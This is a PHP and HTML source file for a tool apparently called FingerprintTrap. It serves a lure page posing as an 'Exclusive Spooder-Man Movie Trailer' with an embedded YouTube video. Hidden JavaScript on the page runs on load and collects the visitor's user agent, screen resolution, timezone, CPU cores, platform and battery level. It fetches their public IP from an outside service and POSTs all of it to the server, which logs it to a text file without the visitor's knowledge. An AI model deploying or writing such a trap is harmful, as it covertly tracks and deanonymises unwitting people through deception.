<?php
// Made By Aryan Giri 
// official repo : https://github.com/giriaryan694-a11y/FingerprintTrap
// Log file (created in the same directory)
$logFile = 'hook_logs.txt';
if (!file_exists($logFile)) {
    file_put_contents($logFile, "=== Fingerprinting Logs ===\n\n");
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Exclusive Trailer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 10px;
        }
        h1 {
            font-size: 1.8em;
            margin: 10px 0;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 900px;
            margin: 0 auto;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            height: 0;
            overflow: hidden;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <h1>Exclusive: Spooder-Man Movie Trailer</h1>
    <div class="video-container">
        <iframe
            src="https://www.youtube.com/embed/f_Pcu6wTzoA"
            title="Spooder-Man Movie Trailer"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
            referrerpolicy="strict-origin-when-cross-origin"
            allowfullscreen>
        </iframe>
    </div>

    <script>
        // --- Collect Data ---
        const data = {
            ip: "N/A",
            ua: navigator.userAgent,
            res: `${screen.width}x${screen.height}`,
            battery: "N/A",
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || "unknown",
            os: navigator.platform + (navigator.appVersion.includes("Win") ? " (Windows)" :
                     navigator.appVersion.includes("Mac") ? " (Mac)" :
                     navigator.appVersion.includes("Linux") ? " (Linux)" : " (Unknown)"),
            timestamp: new Date().toISOString()
        };

        // --- Fetch Public IP ---
        fetch("https://api.ipify.org?format=json")
            .then(r => r.json())
            .then(json => {
                data.ip = json.ip;
                sendData();
            })
            .catch(() => sendData());

        // --- Fetch Battery Status (if supported) ---
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                data.battery = `${battery.level * 100}%`;
                sendData();
            });
        } else {
            sendData();
        }

        // --- Send Data to Server ---
        function sendData() {
            fetch(window.location.href, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>

<?php
// --- Log Data ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    if ($data) {
        $logEntry = "[".date("Y-m-d H:i:s")."]\n";
        foreach ($data as $key => $value) {
            $logEntry .= ucfirst($key).": ".$value."\n";
        }
        file_put_contents($logFile, $logEntry."\n", FILE_APPEND);
    }
}
?>
